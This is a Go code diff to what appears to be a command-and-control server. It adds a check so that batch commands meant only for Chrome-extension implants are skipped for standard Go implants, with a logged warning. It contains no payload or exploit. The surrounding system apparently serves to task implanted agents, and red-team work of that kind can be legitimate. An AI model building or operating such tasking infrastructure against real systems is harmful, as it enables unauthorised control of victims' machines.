@@ -137,6 +137,20 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 	tasks := make([]db.Task, 0, len(uniqueIDs))
 	validAgentIDs := make([]string, 0, len(uniqueIDs))
 
+	// Chrome-extension-only task types must not be sprayed onto standard Go
+	// implants via the batch path (the single-task createTask path rejects
+	// them); build the set of chrome-tagged agents up front.
+	chromeOnly := chromeTaskTypes[req.TaskType]
+	chromeSet := map[string]bool{}
+	if chromeOnly {
+		var chromeAgents []db.Implant
+		if err := s.db.Select("id").Where("tags LIKE ?", "%chrome%").Find(&chromeAgents).Error; err == nil {
+			for _, a := range chromeAgents {
+				chromeSet[a.ID] = true
+			}
+		}
+	}
+
 	s.agentPendingTasksMu.Lock()
 	for _, agentID := range uniqueIDs {
 		if !existingSet[agentID] {
@@ -146,6 +160,12 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 		// Validate task type once per agent
 		if !IsKnownTaskType(req.TaskType) && !protocol.ValidTaskType(req.TaskType) {
 			slog.Error("Batch command: unknown task type", "type", req.TaskType)
+			continue
+		}
+
+		if chromeOnly && !chromeSet[agentID] {
+			slog.Warn("Batch command: skipping chrome-only task for non-chrome agent",
+				"agent_id", agentID, "type", req.TaskType)
 			continue
 		}
 
